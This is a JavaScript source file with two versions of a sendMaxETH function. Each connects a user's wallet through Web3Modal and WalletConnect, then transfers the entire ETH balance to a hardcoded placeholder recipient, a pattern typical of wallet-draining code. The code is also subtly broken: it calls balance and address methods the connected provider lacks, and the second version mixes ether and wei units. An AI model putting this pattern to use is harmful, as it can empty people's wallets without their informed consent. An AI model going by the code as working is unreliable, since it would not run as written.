// import Web3Modal from "web3modal";
// import WalletConnectProvider from "@walletconnect/web3-provider";

// const web3Modal = new Web3Modal({
//   network: "mainnet", // or "ropsten", "rinkeby", etc.
//   provider: new WalletConnectProvider({
//     infuraId: "YOUR_INFURA_ID",
//   }),
// });

// async function sendMaxETH() {
//   // Connect to wallet
//   const provider = await web3Modal.connect();

//   // Get user's ETH balance
//   const balance = await provider.eth.getBalance(provider.address);

//   // Convert balance to a usable number
//   const ethBalance = provider.utils.fromWei(balance, "ether");

//   // Get the maximum amount of ETH to send as a string
//   const maxETH = ethBalance.toString();

//   // Specify the recipient's address
//   const toAddress = "YOUR_RECIPIENT_ADDRESS";

//   // Send the maximum amount of ETH
//   const transaction = await provider.eth.sendTransaction({
//     to: toAddress,
//     value: provider.utils.toWei(maxETH, "ether"),
//   });

//   // Check if the transaction was successful
//   if (transaction.hash) {
//     console.log(`Transaction successful: ${transaction.hash}`);
//   } else {
//     console.error("Transaction failed");
//   }
// }

// sendMaxETH();



// import the necessary modules
import Web3Modal from 'web3modal';
import WalletConnectProvider from '@walletconnect/web3-provider';

// initialize the Web3Modal with the WalletConnect provider
const web3Modal = new Web3Modal({
  provider: new WalletConnectProvider({
    infuraId: 'YOUR_INFURA_ID'
  })
});

async function sendMaxETH() {
  // connect to the wallet
  const provider = await web3Modal.connect();

  // get the user's address and the current balance
  const address = await provider.getAddress();
  const balance = await provider.getBalance(address);

  // calculate the maximum amount of ETH to send
  const maxETH = balance.div(1e18);

  // specify the recipient's address and the amount to send
  const recipient = 'RECIPIENT_ADDRESS';
  const amount = maxETH;

  // send the transaction
  const tx = await provider.sendTransaction({
    to: recipient,
    value: amount
  });

  // check the transaction's status
  const receipt = await provider.getTransactionReceipt(tx.hash);
  if (receipt.status) {
    console.log(`Transaction successful!`);
  } else {
    console.log(`Transaction failed.`);
  }

  // disconnect from the wallet
  await web3Modal.clearCachedProvider();
}

